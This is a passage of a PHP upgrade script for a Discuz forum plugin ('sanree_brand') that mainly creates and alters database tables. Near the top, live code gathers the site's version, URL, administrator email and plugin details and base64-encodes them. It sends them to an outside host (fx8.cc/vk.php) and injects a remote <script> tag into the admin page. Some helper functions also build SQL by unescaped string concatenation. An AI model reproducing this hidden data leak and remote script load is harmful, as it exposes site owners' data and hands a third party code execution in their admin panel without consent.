<?php

/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: upgrade.php 2014-07-29 10:20:00 sanree checkedby fx8.cc $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
    'site_version' => DISCUZ_VERSION,
    'site_release' => DISCUZ_RELEASE,
    'site_timestamp' => TIMESTAMP,
    'site_url' => $_G['siteurl'],
    'site_adminemail' => $_G['setting']['adminemail'],
    'plugin_identifier' => $pluginid,
    'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 2,	
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";
$pv = $pluginarray['plugin']['version'];

function srsysfilecache($data, $file) {
	global $_G;
    $data = stripcslashes($data);
	$dir = DISCUZ_ROOT.'./data/sysdata/';
	if(!is_dir($dir)) {
		dmkdir($dir, 0777);
	}
	if($fp = @fopen($dir.'cache_'.$file, 'wb')) {
		fwrite($fp, $data);
		fclose($fp);
	} else {
		exit('Can not write to cache files, please check directory ./data/ and ./data/sysdata/ .');
	}
}

function table_exists($tablename) {
	global $_G;
	$dbname=$_G['config']['db'][1]['dbname'];
	$query=DB::query("SHOW TABLES FROM $dbname");
	$tables=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		foreach($row as $key => $val) {
			$tables[] = $val;
		}
	}
	$tablename=DB::table($tablename);
	return in_array($tablename, $tables);
}

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

function rowvalue_exists($pk, $table) {
	
	$query = DB::query('SELECT * FROM '.DB::table($table).' WHERE `'.$pk['field'].'` = '.$pk['value']);
	
	return mysql_fetch_array($query,MYSQL_NUM);
}

function setGroup() {
	
	$query=DB::query('SELECT count( * ) FROM '.DB::table('sanree_brand_group'));
	$row = mysql_fetch_array($query,MYSQL_NUM);
		
	$query=DB::query('SELECT groupid FROM '.DB::table('sanree_brand_group'));
	while ($groupid = mysql_fetch_array($query,MYSQL_NUM)) {
		$groupids[]=$groupid[0];
	}
	
	foreach($groupids as $key => $groupid) {
		
		$query=DB::query('UPDATE '.DB::table('sanree_brand_group').' SET `order` = '.$key.' WHERE `groupid` ='.$groupid);
		$query=DB::query('UPDATE '.DB::table('sanree_brand_group').' SET `price` = 10000 WHERE `groupid` ='.$groupid);
		
	}
	
}


$sql = <<<EOF

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_attachment` (
  `aid` mediumint(8) unsigned NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  `filename` varchar(255) NOT NULL default '',
  `filesize` int(10) unsigned NOT NULL default '0',
  `attachment` varchar(255) NOT NULL default '',
  `remote` tinyint(1) unsigned NOT NULL default '0',
  `isimage` tinyint(1) NOT NULL default '0',
  `width` smallint(6) unsigned NOT NULL default '0',
  `thumb` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`aid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_slide` (
  `ID` int(11) default NULL,
  `pic1` varchar(255) default NULL,
  `movie1` varchar(255) default NULL,
  `pic2` varchar(255) default NULL,
  `movie2` varchar(255) default NULL,
  `pic3` varchar(255) default NULL,
  `movie3` varchar(255) default NULL,
  `pic4` varchar(255) default NULL,
  `movie4` varchar(255) default NULL,
  `pic5` varchar(255) default NULL,
  `movie5` varchar(255) default NULL,
  `movie11` varchar(255) default NULL,
  `movie22` varchar(255) default NULL,
  `movie33` varchar(255) default NULL,
  `movie44` varchar(255) default NULL,
  `movie55` varchar(255) default NULL
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_group` (
  `groupid` int(11) unsigned NOT NULL auto_increment,
  `groupname` varchar(255) NOT NULL,
  `grouplogo` varchar(255) default NULL,
  `dateline` int(11) unsigned NOT NULL,
  `isuse` tinyint(1) NOT NULL,
  `adminid` int(11) NOT NULL,
  `urlmod` int(11) NOT NULL,
  `maxalbumcategory` mediumint(5) NOT NULL,
  `maxalbum` mediumint(5) NOT NULL,    
  PRIMARY KEY  (`groupid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_voter` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `star1` int(11) NOT NULL default '0',
  `star2` int(11) NOT NULL default '0',
  `star3` int(11) NOT NULL default '0',
  `star4` int(11) NOT NULL default '0',
  `star5` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_voterlog` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(255) default NULL,
  `star` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_cmenu` (
  `id` smallint(6) unsigned NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `sort` tinyint(1) NOT NULL default '0',
  `displayorder` tinyint(3) NOT NULL,
  `clicks` smallint(6) unsigned NOT NULL default '1',
  `uid` mediumint(8) unsigned NOT NULL,
  `dateline` int(10) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL default '0',
  `window` tinyint(4) NOT NULL default '0', 
  `istop` mediumint(3) NOT NULL default '0',   
  PRIMARY KEY  (`id`),
  KEY `uid` (`uid`),
  KEY `displayorder` (`displayorder`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_msg` (
  `msgid` smallint(6) NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `typeid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `words` varchar(255) default NULL,
  `status` tinyint(4) NOT NULL default '0',
  `dateline` int(10) NOT NULL default '0',
  `refuse` text default NULL,
  `opdate` int(10) NOT NULL default '0',  
  PRIMARY KEY  (`msgid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_district` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL default '',
  `level` tinyint(4) unsigned NOT NULL default '0',
  `usetype` tinyint(1) unsigned NOT NULL default '0',
  `upid` mediumint(8) unsigned NOT NULL default '0',
  `displayorder` smallint(6) NOT NULL default '0',
  `enabled` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `upid` (`upid`,`displayorder`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_album` (
  `albumid` mediumint(8) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `tid` int(11) NOT NULL,
  `albumname` varchar(50) NOT NULL default '',
  `catid` smallint(6) unsigned NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `updatetime` int(10) unsigned NOT NULL default '0',
  `picnum` smallint(6) unsigned NOT NULL default '0',
  `pic` varchar(255) NOT NULL default '',
  `picflag` tinyint(1) NOT NULL default '0',
  `friend` tinyint(1) NOT NULL default '0',
  `password` varchar(10) NOT NULL default '',
  `target_ids` text NOT NULL,
  `favtimes` mediumint(8) unsigned NOT NULL,
  `sharetimes` mediumint(8) unsigned NOT NULL,
  `depict` text NOT NULL,
  `displayorder` int(11) NOT NULL,
  `ishome` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`albumid`),
  KEY `uid` (`uid`,`updatetime`),
  KEY `updatetime` (`updatetime`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_album_category` (
  `catid` mediumint(8) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `tid` int(11) NOT NULL,
  `uid` int(11) NOT NULL default '0',
  `upid` mediumint(8) unsigned NOT NULL default '0',
  `catname` varchar(255) NOT NULL default '',
  `pic` varchar(255) NOT NULL,
  `num` mediumint(8) unsigned NOT NULL default '0',
  `displayorder` smallint(6) NOT NULL default '0',
  `description` text NOT NULL,
  `dateline` int(11) NOT NULL,
  PRIMARY KEY  (`catid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_businesses_module` (
  `mid` int(11) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  PRIMARY KEY  (`mid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_language` (
  `lanid` int(11) unsigned NOT NULL auto_increment,
  `module` varchar(50) default NULL,
  `langkey` varchar(255) NOT NULL,
  `langvalue` varchar(255) NOT NULL,
  PRIMARY KEY  (`lanid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_diystyle` (
  `diystyleid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diystyleid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_diytemplate` (
  `diytemplateid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diytemplateid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_group_module` (
  `mid` int(11) unsigned NOT NULL auto_increment,
  `groupid` int(11) NOT NULL,
  PRIMARY KEY  (`mid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_tag` (
  `tagid` int(11) unsigned NOT NULL auto_increment,
  `tagname` char(255) NOT NULL default '',
  `status` tinyint(1) NOT NULL default '0',
  `displayorder` int(11) default '0',  
  `dateline` int(11) default NULL,  
  PRIMARY KEY  (`tagid`),
  KEY `tagname` (`tagname`),
  KEY `status` (`status`,`tagid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_mf` (
  `mfid` int(11) unsigned NOT NULL auto_increment,
  `mfname` char(255) NOT NULL default '',
  `status` tinyint(1) NOT NULL default '0',
  `displayorder` int(11) default '0', 
  `dateline` int(11) default NULL,   
  PRIMARY KEY  (`mfid`),
  KEY `mfname` (`mfname`),
  KEY `status` (`status`,`mfid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_searchword` (
  `id` int(11) NOT NULL auto_increment,
  `keyword` varchar(255) NOT NULL,
  `dateline` int(11) default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_assist` (
	`aid` int(11) unsigned NOT NULL auto_increment,
	`bid` int(11) unsigned NOT NULL,
	`uid` int(11) unsigned NOT NULL,
	`dateline` int(10) unsigned NOT NULL default '0',
	PRIMARY KEY  (`aid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_record` (
	`rid` int(11) unsigned NOT NULL auto_increment,
	`bid` int(11) unsigned NOT NULL,
	`uid` int(11) unsigned NOT NULL,
	`former` int(11) unsigned NOT NULL,
	`gid` int(11) unsigned NOT NULL,
	`cost` int(11) unsigned NOT NULL,
	`dateline` int(10) unsigned NOT NULL default '0',
	PRIMARY KEY  (`rid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_menu_order` (
	`index` int(11) unsigned NOT NULL,
	`myalbum` int(11) unsigned NOT NULL,
	`dzgroup` int(11) unsigned NOT NULL,
	`goods` int(11) unsigned NOT NULL,
	`news` int(11) unsigned NOT NULL,
	`coupon` int(11) unsigned NOT NULL,
	`jobs` int(11) unsigned NOT NULL,
	`video` int(11) unsigned NOT NULL,
	`guestbook` int(11) unsigned NOT NULL,
	`ordinary` int(11) unsigned NOT NULL
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_friendly_link` (
  `flid` int(11) NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) default NULL,
  `dateline` int(11) NOT NULL,
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY  (`flid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_hint` (
  `hid` int(11) unsigned NOT NULL auto_increment,
  `uid` int(11) NOT NULL,
  `enter` smallint(1) default NULL,
  PRIMARY KEY  (`hid`)
) ENGINE=MyISAM;

EOF;

runquery($sql);	

if (!exitscolumn('pcateid','sanree_brand_category')) {
	$sql="ALTER TABLE `pre_sanree_brand_category` ADD `pcateid` INT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('caid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `caid` INT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('aid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `aid` INT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('qq','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `qq` VARCHAR( 50 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('address','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `address` VARCHAR( 255 ) NULL;";
	runquery($sql);	
} 
if (!exitscolumn('recommendationindex','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `recommendationindex` DECIMAL( 10, 1 ) NOT NULL DEFAULT '99.9';";
	runquery($sql);	
} 
if (!exitscolumn('tel','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `tel` VARCHAR( 20 ) NULL;";
	runquery($sql);	
} 
if (!exitscolumn('views','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `views` INT NULL DEFAULT '1';";
	runquery($sql);	
}
if (!exitscolumn('groupid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `groupid` INT( 11 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('birthprovince','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `birthprovince` VARCHAR( 255 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('birthcity','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `birthcity` VARCHAR( 255 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('birthdist','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `birthdist` VARCHAR( 255 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('birthcommunity','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `birthcommunity` VARCHAR( 255 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('memo','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `memo` TEXT NOT NULL ;";
	runquery($sql);	
}
if (!exitscolumn('brandno','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `brandno` varchar(50) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('mappos','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `mappos` VARCHAR( 100 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('discount','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `discount` INT NOT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('ownerid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `ownerid` INT NOT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('srbirthprovince','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `srbirthprovince` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('srbirthcity','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `srbirthcity` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('srbirthdist','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `srbirthdist` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('srbirthcommunity','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `srbirthcommunity` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('maxalbumcategory','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `maxalbumcategory` MEDIUMINT( 5 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('maxalbum','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `maxalbum` MEDIUMINT( 5 ) NOT NULL ;";
	runquery($sql);	
}
if (!exitscolumn('istop','sanree_brand_cmenu')) {
	$sql="ALTER TABLE `pre_sanree_brand_cmenu` ADD `istop` MEDIUMINT( 3 ) NOT NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('allowalbum','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `allowalbum` TINYINT( 1 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('startdate','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `startdate` INT( 11 ) NOT NULL ;";
	runquery($sql);	
}

if (!exitscolumn('enddate','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `enddate` INT( 11 ) NOT NULL;";
	runquery($sql);	
}
if (!exitscolumn('allowfastpost','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `allowfastpost` TINYINT( 1 ) NOT NULL DEFAULT '1';";
	runquery($sql);	
}
if (!exitscolumn('banner','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `banner` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('opdate','sanree_brand_msg')) {
	$sql="ALTER TABLE `pre_sanree_brand_msg` ADD `opdate` int(10) NOT NULL default '0';";
	runquery($sql);	
}
if (!exitscolumn('isshowbrandname','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `isshowbrandname` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('googlemappos','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `googlemappos` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('allowtemplate','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `allowtemplate` TINYINT( 1 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('templateconfig','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `templateconfig` TEXT NULL;";
	runquery($sql);	
}
if (!exitscolumn('allowmultiple','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `allowmultiple` TINYINT( 1 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('msn','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `msn` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('wangwang','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `wangwang` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('baiduhi','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `baiduhi` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('skype','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `skype` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('allowdeletealbum','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `allowdeletealbum` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('allowbatchimage','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `allowbatchimage` TINYINT( 1 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('pbid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `pbid` INT( 11 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('brandmf','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `brandmf` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('brandtag','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `brandtag` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('allowsyngroup','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `allowsyngroup` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('syngroupid','sanree_brand_category')) {
	$sql="ALTER TABLE `pre_sanree_brand_category` ADD `syngroupid` INT( 11 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('clogo','sanree_brand_category')) {
	$sql="ALTER TABLE `pre_sanree_brand_category` ADD `clogo` VARCHAR( 255 ) NULL;";
	runquery($sql);
}
if (!exitscolumn('syngrouptid','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `syngrouptid` INT( 11 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('iscard','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `iscard` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('smallicons','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `smallicons` VARCHAR( 255 ) NULL ;";
	runquery($sql);	
}
if (!exitscolumn('weixin','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `weixin` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('weixinimg','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `weixinimg` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}

if (!exitscolumn('weixinpublic','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `weixinpublic` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}
if (!exitscolumn('weixinpublicpic','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `weixinpublicpic` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}

if (!exitscolumn('carddetail','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `carddetail` VARCHAR( 255 ) NULL;";
	runquery($sql);	
}

if (!exitscolumn('order','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `order` INT( 11 ) NOT NULL AFTER `groupid`;";
	runquery($sql);	
}
if (!exitscolumn('price','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `price` INT( 11 ) NOT NULL AFTER `order`;";
	runquery($sql);	
}

if (!exitscolumn('ismf','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `ismf` TINYINT(1) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('istag','sanree_brand_group')) {
	$sql="ALTER TABLE `pre_sanree_brand_group` ADD `istag` TINYINT(1) NULL DEFAULT '0';";
	runquery($sql);	
}

if (!exitscolumn('newbanner','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `newbanner` VARCHAR( 255 ) NULL AFTER `banner`;";
	runquery($sql);	
}

if (!exitscolumn('newbannerurl','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `newbannerurl` VARCHAR( 255 ) NULL AFTER `newbanner`;";
	runquery($sql);
}

if (!exitscolumn('wezgimg','sanree_brand_businesses')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses` ADD `wezgimg` VARCHAR( 255 ) NULL AFTER `newbannerurl`;";
	runquery($sql);
}

$sql="ALTER TABLE `pre_sanree_brand_businesses` CHANGE `qq` `qq` VARCHAR( 255 ) NULL DEFAULT NULL;";
runquery($sql);

$sql="ALTER TABLE `pre_sanree_brand_businesses` CHANGE `tel` `tel` VARCHAR( 255 ) NULL DEFAULT NULL;";
runquery($sql);


if (!rowvalue_exists(array('field' => 'index', 'value' => 0), 'sanree_brand_menu_order')) {

$addsql1 = <<<EOF
INSERT INTO `pre_sanree_brand_menu_order` (`index`, `myalbum`, `dzgroup`, `goods`, `news`, `coupon`, `jobs`, `video`, `guestbook`, `ordinary`) VALUES
(0, 1, 2, 3, 4, 5, 6, 7, 8, 9);
EOF;
 
runquery($addsql1);

}

if ($pv*1000<=1608) {

	setGroup();

}

if ($pv*1000<=1430) {
$addsql1 = <<<EOF
INSERT INTO `pre_sanree_brand_slide` (`ID`, `pic1`, `movie1`, `pic2`, `movie2`, `pic3`, `movie3`, `pic4`, `movie4`, `pic5`, `movie5`, `movie11`, `movie22`, `movie33`, `movie44`, `movie55`) VALUES
(2, '{pluginimg}/sad21.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad22.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad23.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad24.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad25.jpg', 'http://www.fx8.cc/', NULL, NULL, NULL, NULL, NULL);
EOF;
runquery($addsql1);
}
if ($pv*1000<=1408) {
$addsql1 = <<<EOF
INSERT INTO `pre_sanree_brand_diytemplate` (`diytemplateid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES 
(1, '$installlang[blockclass_index_styletexttitle]', '<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n<li><a href="{url}"{target}>{brandname}</a></li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>', 1, 'admin', 1349698114, 0, 1, 1), 
(2, '$installlang[blockclass_index_styleimgtitle]', '<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n<li>\\r\\n<p><a href="{url}"{target}><img src="{pic}" width="{picwidth}" height="{picheight}" /></a></p>\\r\\n<p><a href="{url}"{target}>{brandname}</a></p>\\r\\n</li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>', 1, 'admin', 1349746834, 0, 1, 1); 
EOF;
runquery($addsql1);
$addsql1 = <<<EOF
INSERT INTO `pre_sanree_brand_diystyle` (`diystyleid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, 'hotbrand', '.stylename{\\r\\n}\\r\\n.stylename ul li{\\r\\nfloat:left;\\r\\noverflow:hidden;\\r\\nwidth:200px;\\r\\nheight:200px;\\r\\nmargin:10px;\\r\\n}\\r\\n.stylename ul li img{\\r\\nwidth:200px;\\r\\n}', 1, 'admin', 1349690762, 1, 1, 1);
EOF;
runquery($addsql1);
}

if ($pv*1000<1300) {
$addsql1 = <<<EOF
INSERT INTO `pre_sanree_brand_cmenu` (`title`, `url`, `sort`, `displayorder`, `clicks`, `uid`, `dateline`, `status`, `window`, `istop`) VALUES
('$installlang[fankui]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=2', 0, 1, 1, 0, 1344828662, 1, 1, 0),
('$installlang[baocuo]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=0', 0, 1, 1, 0, 1344828662, 1, 1, 0),
